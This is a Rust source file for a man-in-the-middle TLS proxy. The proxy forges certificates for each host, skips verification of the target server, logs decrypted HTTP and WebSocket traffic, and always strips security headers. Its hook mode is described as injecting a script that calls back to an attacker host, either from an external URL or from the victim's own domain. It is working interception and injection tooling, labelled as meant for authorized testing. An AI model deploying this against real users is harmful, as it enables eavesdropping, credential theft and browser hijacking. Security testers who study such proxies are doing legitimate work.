//! MITM TLS Proxy Implementation
//!
//! Man-in-the-Middle proxy for TLS inspection and modification.
//!
//! # How it works
//!
//! ```text
//! Client                    MITM Proxy                         Target
//!   |                           |                                 |
//!   |-- CONNECT host:443 ------>|                                 |
//!   |<-- 200 Connection OK -----|                                 |
//!   |                           |                                 |
//!   |-- TLS ClientHello ------->|                                 |
//!   |<-- TLS ServerHello -------|  [Generate fake cert for host]  |
//!   |<-- TLS Certificate -------|                                 |
//!   |-- TLS Finished ---------->|                                 |
//!   |                           |---- TLS ClientHello ----------->|
//!   |                           |<--- TLS ServerHello ------------|
//!   |                           |<--- TLS Certificate ------------|
//!   |                           |---- TLS Finished -------------->|
//!   |                           |                                 |
//!   |<==== Decrypted HTTP =====>|<==== Encrypted TLS ============>|
//! ```
//!
//! # Security Warning
//!
//! This module is for authorized security testing only.
//! Unauthorized interception of network traffic is illegal.

use std::collections::HashMap;
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::{Arc, Mutex, RwLock};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use super::{Address, ProxyContext, ProxyError, ProxyResult};
use crate::crypto::certs::ca::CertificateAuthority;
use crate::{debug, error, info};

mod hook;
mod http_messages;
mod websocket;

use hook::relay_tls_with_hook;
pub use http_messages::{HttpRequest, HttpResponse};
use websocket::websocket_passthrough;

/// Log format for traffic logging
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum LogFormat {
  Text,
  Json,
}

impl LogFormat {
  pub fn from_str(s: &str) -> Self {
    match s.to_lowercase().as_str() {
      "json" => LogFormat::Json,
      _ => LogFormat::Text,
    }
  }
}

/// Traffic logger that can write to stdout and/or file
#[derive(Clone)]
pub struct TrafficLogger {
  /// Log to stdout
  pub log_stdout: bool,
  /// Log file path
  pub log_file: Option<PathBuf>,
  /// Log format
  pub format: LogFormat,
  /// File writer (shared across threads)
  file_writer: Option<Arc<Mutex<BufWriter<File>>>>,
}

impl TrafficLogger {
  pub fn new(log_stdout: bool, log_file: Option<PathBuf>, format: LogFormat) -> Self {
    let file_writer = log_file.as_ref().and_then(|path| {
      OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .ok()
        .map(|f| Arc::new(Mutex::new(BufWriter::new(f))))
    });

    Self {
      log_stdout,
      log_file,
      format,
      file_writer,
    }
  }

  /// Check if logging is enabled at all
  pub fn is_enabled(&self) -> bool {
    self.log_stdout || self.file_writer.is_some()
  }

  /// Log a request
  pub fn log_request(&self, hostname: &str, method: &str, path: &str, version: &str) {
    if !self.is_enabled() {
      return;
    }

    let timestamp = SystemTime::now()
      .duration_since(UNIX_EPOCH)
      .map(|d| d.as_secs())
      .unwrap_or(0);

    match self.format {
      LogFormat::Text => {
        let msg = format!("[{}] {} {} {}", hostname, method, path, version);
        self.write_line(&msg);
      }
      LogFormat::Json => {
        let json = format!(
          r#"{{"ts":{},"type":"request","host":"{}","method":"{}","path":"{}","version":"{}"}}"#,
          timestamp, hostname, method, path, version
        );
        self.write_line(&json);
      }
    }
  }

  /// Log a response
  pub fn log_response(&self, hostname: &str, status_code: u16, status_text: &str) {
    if !self.is_enabled() {
      return;
    }

    let timestamp = SystemTime::now()
      .duration_since(UNIX_EPOCH)
      .map(|d| d.as_secs())
      .unwrap_or(0);

    match self.format {
      LogFormat::Text => {
        let msg = format!("[{}] <- {} {}", hostname, status_code, status_text);
        self.write_line(&msg);
      }
      LogFormat::Json => {
        let json = format!(
          r#"{{"ts":{},"type":"response","host":"{}","status":{},"status_text":"{}"}}"#,
          timestamp, hostname, status_code, status_text
        );
        self.write_line(&json);
      }
    }
  }

  /// Log an info message
  pub fn log_info(&self, message: &str) {
    if !self.is_enabled() {
      return;
    }

    let timestamp = SystemTime::now()
      .duration_since(UNIX_EPOCH)
      .map(|d| d.as_secs())
      .unwrap_or(0);

    match self.format {
      LogFormat::Text => {
        self.write_line(message);
      }
      LogFormat::Json => {
        let json = format!(
          r#"{{"ts":{},"type":"info","message":"{}"}}"#,
          timestamp,
          message.replace('"', "\\\"")
        );
        self.write_line(&json);
      }
    }
  }

  /// Log a WebSocket frame
  pub fn log_ws_frame(
    &self,
    hostname: &str,
    direction: &str,
    frame_num: u64,
    frame_type: &str,
    size: usize,
  ) {
    if !self.is_enabled() {
      return;
    }

    let timestamp = SystemTime::now()
      .duration_since(UNIX_EPOCH)
      .map(|d| d.as_secs())
      .unwrap_or(0);

    match self.format {
      LogFormat::Text => {
        let msg = format!(
          "[{}] WebSocket {} frame #{}: {} ({} bytes)",
          hostname, direction, frame_num, frame_type, size
        );
        self.write_line(&msg);
      }
      LogFormat::Json => {
        let json = format!(
          r#"{{"ts":{},"type":"websocket","host":"{}","direction":"{}","frame":{},"frame_type":"{}","size":{}}}"#,
          timestamp, hostname, direction, frame_num, frame_type, size
        );
        self.write_line(&json);
      }
    }
  }

  fn write_line(&self, line: &str) {
    if self.log_stdout {
      eprintln!("[MITM] {}", line);
    }

    if let Some(ref writer) = self.file_writer {
      if let Ok(mut w) = writer.lock() {
        let _ = writeln!(w, "{}", line);
        let _ = w.flush();
      }
    }
  }
}

/// Hook injection mode for MITM proxy
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum HookMode {
  /// External URL (e.g., http://attacker:3000/hook.js) - requires CORS
  External(String),
  /// Same-origin: serve hook from intercepted domain (e.g., /assets/js/rb.js)
  /// The proxy will intercept requests to this path and serve the hook directly
  SameOrigin {
    /// Path to serve the hook from (e.g., "/assets/js/rb.js")
    path: String,
    /// RBB server URL for the hook to call back to (e.g., "http://10.0.0.1:3000")
    callback_url: String,
  },
}

/// MITM proxy configuration
#[derive(Clone)]
pub struct MitmConfig {
  /// Listen address
  pub listen_addr: SocketAddr,
  /// CA certificate and key (for signing intercepted certs)
  pub ca: Arc<CertificateAuthority>,
  /// Connection timeout
  pub timeout: Duration,
  /// Whether to log intercepted requests (deprecated, use logger)
  pub log_requests: bool,
  /// Traffic logger
  pub logger: TrafficLogger,
  /// Request/response interceptor
  pub interceptor: Option<Arc<dyn RequestInterceptor + Send + Sync>>,
  /// Hook injection mode
  pub hook_mode: Option<HookMode>,
}

impl std::fmt::Debug for MitmConfig {
  fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
    f.debug_struct("MitmConfig")
      .field("listen_addr", &self.listen_addr)
      .field("ca", &self.ca)
      .field("timeout", &self.timeout)
      .field("log_requests", &self.log_requests)
      .field(
        "logger",
        &format!(
          "stdout={}, file={:?}, format={:?}",
          self.logger.log_stdout, self.logger.log_file, self.logger.format
        ),
      )
      .field(
        "interceptor",
        &self.interceptor.as_ref().map(|_| "<interceptor>"),
      )
      .field("hook_mode", &self.hook_mode)
      .finish()
  }
}

impl MitmConfig {
  /// Create new MITM config with CA
  pub fn new(listen_addr: SocketAddr, ca: CertificateAuthority) -> Self {
    Self {
      listen_addr,
      ca: Arc::new(ca),
      timeout: Duration::from_secs(30),
      log_requests: true,
      logger: TrafficLogger::new(false, None, LogFormat::Text),
      interceptor: None,
      hook_mode: None,
    }
  }

  /// Set request interceptor
  pub fn with_interceptor(
    mut self,
    interceptor: impl RequestInterceptor + Send + Sync + 'static,
  ) -> Self {
    self.interceptor = Some(Arc::new(interceptor));
    self
  }

  /// Set hook mode
  pub fn with_hook_mode(mut self, mode: HookMode) -> Self {
    self.hook_mode = Some(mode);
    self
  }

  /// Configure same-origin hook mode (hook served from victim's domain)
  pub fn with_same_origin_hook(mut self, path: &str, callback_url: &str) -> Self {
    let mode = HookMode::SameOrigin {
      path: path.to_string(),
      callback_url: callback_url.to_string(),
    };
    self.hook_mode = Some(mode);
    self
  }

  /// Set timeout
  pub fn with_timeout(mut self, timeout: Duration) -> Self {
    self.timeout = timeout;
    self
  }

  /// Configure traffic logging
  pub fn with_logger(
    mut self,
    log_stdout: bool,
    log_file: Option<PathBuf>,
    format: LogFormat,
  ) -> Self {
    let has_file = log_file.is_some();
    self.logger = TrafficLogger::new(log_stdout, log_file, format);
    self.log_requests = log_stdout || has_file;
    self
  }

  /// Enable stdout logging (convenience method)
  pub fn with_stdout_logging(mut self) -> Self {
    self.logger = TrafficLogger::new(true, self.logger.log_file.clone(), self.logger.format);
    self.log_requests = true;
    self
  }

  /// Enable file logging (convenience method)
  pub fn with_file_logging(mut self, path: PathBuf, format: LogFormat) -> Self {
    self.logger = TrafficLogger::new(self.logger.log_stdout, Some(path), format);
    self.log_requests = true;
    self
  }
}

/// Request interceptor trait
pub trait RequestInterceptor {
  /// Called before forwarding request to target
  /// client_addr is the IP:port of the client making the request
  fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction;

  /// Called before returning response to client
  fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction;
}

/// Intercept action
#[derive(Debug, Clone)]
pub enum InterceptAction {
  /// Continue with possibly modified request/response
  Continue,
  /// Drop the request/response
  Drop,
  /// Replace with custom response
  Replace(HttpResponse),
}

/// Certificate cache for MITM
pub struct CertCache {
  /// CA for generating certificates
  ca: Arc<CertificateAuthority>,
  /// Cached certificates (hostname -> (cert_pem, key_pem))
  cache: RwLock<HashMap<String, (String, String)>>,
}

impl CertCache {
  pub fn new(ca: Arc<CertificateAuthority>) -> Self {
    Self {
      ca,
      cache: RwLock::new(HashMap::new()),
    }
  }

  /// Get or generate certificate for hostname
  pub fn get_cert(&self, hostname: &str) -> Result<(String, String), ProxyError> {
    // Check cache first
    if let Some(cached) = self.cache.read().unwrap().get(hostname) {
      return Ok(cached.clone());
    }

    // Generate new certificate
    let (cert, key_der) = self
      .ca
      .generate_cert(hostname)
      .map_err(|e| ProxyError::Tls(format!("Failed to generate cert: {}", e)))?;

    let cert_pem = cert.to_pem();
    let key_pem = {
      use crate::crypto::encoding::pem::PemBlock;
      PemBlock::with_label("PRIVATE KEY", key_der).encode()
    };

    // Cache it
    self
      .cache
      .write()
      .unwrap()
      .insert(hostname.to_string(), (cert_pem.clone(), key_pem.clone()));

    Ok((cert_pem, key_pem))
  }
}

/// MITM Proxy Server
pub struct MitmProxy {
  config: MitmConfig,
  context: Arc<ProxyContext>,
  cert_cache: Arc<CertCache>,
}

impl MitmProxy {
  /// Create new MITM proxy
  pub fn new(config: MitmConfig) -> Self {
    let cert_cache = Arc::new(CertCache::new(config.ca.clone()));
    Self {
      config,
      context: Arc::new(ProxyContext::default()),
      cert_cache,
    }
  }

  /// Run the MITM proxy server
  pub fn run(&self) -> ProxyResult<()> {
    let listener = TcpListener::bind(self.config.listen_addr)?;
    info!("MITM proxy listening on {}", self.config.listen_addr);
    info!("CA Subject: {}", self.config.ca.subject());
    info!("CA Fingerprint: {}", self.config.ca.fingerprint());

    for stream in listener.incoming() {
      match stream {
        Ok(client) => {
          let config = self.config.clone();
          let context = self.context.clone();
          let cert_cache = self.cert_cache.clone();

          thread::spawn(move || {
            if let Err(e) = Self::handle_client(client, &config, &context, &cert_cache) {
              debug!("Client error: {}", e);
            }
          });
        }
        Err(e) => {
          error!("Accept error: {}", e);
        }
      }
    }

    Ok(())
  }

  /// Handle a client connection
  fn handle_client(
    mut client: TcpStream,
    config: &MitmConfig,
    _context: &ProxyContext,
    cert_cache: &CertCache,
  ) -> ProxyResult<()> {
    client.set_read_timeout(Some(config.timeout))?;
    client.set_write_timeout(Some(config.timeout))?;

    let client_addr = client.peer_addr()?;
    debug!("New connection from {}", client_addr);

    // Read the initial request (expecting CONNECT)
    let mut buf = [0u8; 8192];
    let n = client.read(&mut buf)?;
    if n == 0 {
      return Ok(());
    }

    let request = String::from_utf8_lossy(&buf[..n]);

    // Parse CONNECT request
    if !request.starts_with("CONNECT ") {
      // Not a CONNECT request - could handle as regular HTTP proxy
      let response = "HTTP/1.1 400 Bad Request\r\n\r\nOnly CONNECT method supported for MITM\r\n";
      client.write_all(response.as_bytes())?;
      return Ok(());
    }

    // Parse target host:port
    let target = Self::parse_connect_target(&request)?;
    let hostname = target.host();
    let port = target.port();

    info!("CONNECT to {}:{}", hostname, port);

    // Connect to target
    let target_addr = format!("{}:{}", hostname, port);
    let target_stream = TcpStream::connect_timeout(
      &target_addr
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| ProxyError::ResolutionFailed(hostname.clone()))?,
      config.timeout,
    )?;

    // Send 200 Connection Established
    client.write_all(b"HTTP/1.1 200 Connection Established\r\n\r\n")?;

    // Now we need to perform TLS handshake with both sides
    // 1. TLS handshake with client (we are the server)
    // 2. TLS handshake with target (we are the client)

    if port == 443 || port == 8443 {
      // TLS interception
      Self::handle_tls_intercept(client, target_stream, &hostname, config, cert_cache)
    } else {
      // Plain TCP relay
      Self::relay_tcp(client, target_stream)
    }
  }

  /// Parse CONNECT target from request
  fn parse_connect_target(request: &str) -> ProxyResult<Address> {
    // CONNECT host:port HTTP/1.1
    let first_line = request
      .lines()
      .next()
      .ok_or_else(|| ProxyError::Protocol("Empty request".into()))?;

    let parts: Vec<_> = first_line.split_whitespace().collect();
    if parts.len() < 2 {
      return Err(ProxyError::Protocol("Invalid CONNECT request".into()));
    }

    let host_port = parts[1];
    if let Some(colon) = host_port.rfind(':') {
      let host = &host_port[..colon];
      let port: u16 = host_port[colon + 1..]
        .parse()
        .map_err(|_| ProxyError::Protocol("Invalid port".into()))?;
      Ok(Address::from_domain(host, port))
    } else {
      Err(ProxyError::Protocol("Missing port in CONNECT".into()))
    }
  }

  /// Handle TLS interception (Windows stub - returns error)
  #[cfg(target_os = "windows")]
  fn handle_tls_intercept(
    _client: TcpStream,
    _target: TcpStream,
    _hostname: &str,
    _config: &MitmConfig,
    _cert_cache: &CertCache,
  ) -> ProxyResult<()> {
    Err(ProxyError::Tls(
      "TLS interception is not available on Windows (requires OpenSSL)".to_string(),
    ))
  }

  /// Handle TLS interception
  #[cfg(not(target_os = "windows"))]
  fn handle_tls_intercept(
    client: TcpStream,
    target: TcpStream,
    hostname: &str,
    config: &MitmConfig,
    cert_cache: &CertCache,
  ) -> ProxyResult<()> {
    use boring::pkey::PKey;
    use boring::ssl::{SslAcceptor, SslConnector, SslMethod, SslVerifyMode};
    use boring::x509::X509;

    // Get/generate certificate for this hostname
    let (cert_pem, key_pem) = cert_cache.get_cert(hostname)?;

    // Create SSL acceptor (we act as server to client)
    let mut acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls())
      .map_err(|e| ProxyError::Tls(format!("Acceptor build failed: {}", e)))?;

    // Load our generated certificate
    let cert = X509::from_pem(cert_pem.as_bytes())
      .map_err(|e| ProxyError::Tls(format!("Cert parse failed: {}", e)))?;
    let key = PKey::private_key_from_pem(key_pem.as_bytes())
      .map_err(|e| ProxyError::Tls(format!("Key parse failed: {}", e)))?;

    acceptor
      .set_private_key(&key)
      .map_err(|e| ProxyError::Tls(format!("Set key failed: {}", e)))?;
    acceptor
      .set_certificate(&cert)
      .map_err(|e| ProxyError::Tls(format!("Set cert failed: {}", e)))?;

    // Add CA cert to chain
    let ca_cert = X509::from_pem(config.ca.export_ca_pem().as_bytes())
      .map_err(|e| ProxyError::Tls(format!("CA cert parse failed: {}", e)))?;
    acceptor
      .add_extra_chain_cert(ca_cert)
      .map_err(|e| ProxyError::Tls(format!("Add chain failed: {}", e)))?;

    let acceptor = acceptor.build();

    // Accept TLS from client
    let mut client_tls = acceptor
      .accept(client)
      .map_err(|e| ProxyError::Tls(format!("TLS accept failed: {}", e)))?;

    info!("TLS handshake with client complete for {}", hostname);

    // Create SSL connector (we act as client to target)
    let mut connector = SslConnector::builder(SslMethod::tls())
      .map_err(|e| ProxyError::Tls(format!("Connector build failed: {}", e)))?;

    // Don't verify target certificate (we're intercepting)
    connector.set_verify(SslVerifyMode::NONE);

    let connector = connector.build();

    // Connect TLS to target
    let mut target_tls = connector
      .connect(hostname, target)
      .map_err(|e| ProxyError::Tls(format!("TLS connect failed: {}", e)))?;

    info!("TLS handshake with target complete for {}", hostname);

    // Now relay data between the two TLS streams
    Self::relay_tls(&mut client_tls, &mut target_tls, hostname, config)
  }

  /// Relay data between two TLS streams with inspection
  fn relay_tls<S1, S2>(
    client: &mut S1,
    target: &mut S2,
    hostname: &str,
    config: &MitmConfig,
  ) -> ProxyResult<()>
  where
    S1: Read + Write,
    S2: Read + Write,
  {
    if config.hook_mode.is_some() {
      relay_tls_with_hook(client, target, hostname, config)
    } else {
      Self::relay_tls_inspect(client, target, hostname, config)
    }
  }

  /// Relay data between two TLS streams with inspection and header stripping
  fn relay_tls_inspect<S1, S2>(
    client: &mut S1,
    target: &mut S2,
    hostname: &str,
    config: &MitmConfig,
  ) -> ProxyResult<()>
  where
    S1: Read + Write,
    S2: Read + Write,
  {
    let mut client_buf = [0u8; 16384];
    let mut target_buf = [0u8; 16384];
    let mut last_request: Option<HttpRequest> = None;

    loop {
      // Try to read from client
      match client.read(&mut client_buf) {
        Ok(0) => {
          debug!("Client closed connection to {}", hostname);
          break;
        }
        Ok(n) => {
          let mut data_to_send = client_buf[..n].to_vec();
          let mut is_websocket_upgrade = false;
          let mut request_action = InterceptAction::Continue;

          // Parse request to log or strip headers
          if let Some(mut req) = HttpRequest::parse(&data_to_send) {
            if let Some(interceptor) = &config.interceptor {
              request_action = interceptor.on_request(&mut req, Some(hostname));
            }

            match request_action {
              InterceptAction::Continue => {
                config
                  .logger
                  .log_request(hostname, &req.method, &req.path, &req.version);

                // Check for WebSocket upgrade request
                if req.is_websocket_upgrade() {
                  config.logger.log_info(&format!(
                    "[{}] WebSocket upgrade request detected",
                    hostname
                  ));
                  is_websocket_upgrade = true;
                  // Don't modify WebSocket upgrade requests
                } else {
                  // Strip Accept-Encoding to prevent compression (only for non-WebSocket)
                  if req.headers.remove("accept-encoding").is_some() {
                    data_to_send = req.to_bytes();
                  }
                }

                last_request = Some(req);
              }
              InterceptAction::Drop => {
                let resp = HttpResponse::simple(403, "Forbidden", "Request dropped by interceptor");
                client.write_all(&resp.to_bytes())?;
                last_request = None;
                continue;
              }
              InterceptAction::Replace(resp) => {
                client.write_all(&resp.to_bytes())?;
                last_request = None;
                continue;
              }
            }
          } else {
            last_request = None;
          }

          // Forward to target
          target.write_all(&data_to_send)?;

          // If this was a WebSocket upgrade, handle the response and switch to passthrough
          if is_websocket_upgrade {
            // Read the upgrade response
            let m = match target.read(&mut target_buf) {
              Ok(0) => break,
              Ok(m) => m,
              Err(e) => return Err(e.into()),
            };

            let mut resp_data = target_buf[..m].to_vec();

            if let Some(mut resp) = HttpResponse::parse(&resp_data) {
              if let Some(interceptor) = &config.interceptor {
                if let Some(req) = last_request.as_ref() {
                  match interceptor.on_response(req, &mut resp) {
                    InterceptAction::Continue => {}
                    InterceptAction::Drop => {
                      last_request = None;
                      continue;
                    }
                    InterceptAction::Replace(replacement) => {
                      config.logger.log_response(
                        hostname,
                        replacement.status_code,
                        &replacement.status_text,
                      );
                      client.write_all(&replacement.to_bytes())?;
                      last_request = None;
                      continue;
                    }
                  }
                }
              }

              config
                .logger
                .log_response(hostname, resp.status_code, &resp.status_text);

              if resp.is_websocket_upgrade() {
                config.logger.log_info(&format!(
                  "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
                  hostname
                ));
                // Forward the upgrade response to client
                client.write_all(&resp.to_bytes())?;
                // Switch to WebSocket passthrough mode
                return websocket_passthrough(client, target, hostname, &config.logger);
              }

              resp_data = resp.to_bytes();
            }

            if resp_data.is_empty() {
              continue;
            }

            // Not a valid WebSocket upgrade, forward response anyway
            client.write_all(&resp_data)?;
            last_request = None;
            continue;
          }
        }
        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
        Err(e) => return Err(e.into()),
      }

      // Try to read from target
      match target.read(&mut target_buf) {
        Ok(0) => {
          debug!("Target closed connection for {}", hostname);
          break;
        }
        Ok(n) => {
          let mut data_to_send = target_buf[..n].to_vec();

          if let Some(mut resp) = HttpResponse::parse(&data_to_send) {
            if let Some(interceptor) = &config.interceptor {
              if let Some(req) = last_request.as_ref() {
                match interceptor.on_response(req, &mut resp) {
                  InterceptAction::Continue => {}
                  InterceptAction::Drop => {
                    last_request = None;
                    continue;
                  }
                  InterceptAction::Replace(replacement) => {
                    config.logger.log_response(
                      hostname,
                      replacement.status_code,
                      &replacement.status_text,
                    );
                    client.write_all(&replacement.to_bytes())?;
                    last_request = None;
                    continue;
                  }
                }
              }
            }

            config
              .logger
              .log_response(hostname, resp.status_code, &resp.status_text);

            // Always strip security headers in MITM mode
            resp.strip_security_headers();
            data_to_send = resp.to_bytes();
          }

          // Forward to client
          client.write_all(&data_to_send)?;
          last_request = None;
        }
        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
        Err(e) => return Err(e.into()),
      }
    }

    Ok(())
  }

  /// Simple TCP relay (no TLS)
  fn relay_tcp(mut client: TcpStream, mut target: TcpStream) -> ProxyResult<()> {
    use std::thread;

    let mut client_clone = client.try_clone()?;
    let mut target_clone = target.try_clone()?;

    // Client -> Target
    let c2t = thread::spawn(move || {
      let mut buf = [0u8; 16384];
      loop {
        match client.read(&mut buf) {
          Ok(0) => break,
          Ok(n) => {
            if target.write_all(&buf[..n]).is_err() {
              break;
            }
          }
          Err(_) => break,
        }
      }
    });

    // Target -> Client
    let t2c = thread::spawn(move || {
      let mut buf = [0u8; 16384];
      loop {
        match target_clone.read(&mut buf) {
          Ok(0) => break,
          Ok(n) => {
            if client_clone.write_all(&buf[..n]).is_err() {
              break;
            }
          }
          Err(_) => break,
        }
      }
    });

    let _ = c2t.join();
    let _ = t2c.join();

    Ok(())
  }

  /// Export CA certificate for installation
  pub fn export_ca_pem(&self) -> String {
    self.config.ca.export_ca_pem()
  }

  /// Export CA certificate as DER
  pub fn export_ca_der(&self) -> Vec<u8> {
    self.config.ca.export_ca_der()
  }
}

/// Default interceptor that logs requests
pub struct LoggingInterceptor;

impl RequestInterceptor for LoggingInterceptor {
  fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction {
    let addr = client_addr.unwrap_or("?");
    info!(
      "[{}] >> {} {} (Host: {})",
      addr, req.method, req.path, req.host
    );
    InterceptAction::Continue
  }

  fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction {
    info!(
      "<< {} {} {} ({})",
      req.host,
      resp.status_code,
      resp.status_text,
      resp.headers.get("content-type").unwrap_or(&"?".to_string())
    );
    InterceptAction::Continue
  }
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_parse_connect_target() {
    let request = "CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n";
    let target = MitmProxy::parse_connect_target(request).unwrap();
    assert_eq!(target.host(), "example.com");
    assert_eq!(target.port(), 443);
  }
}
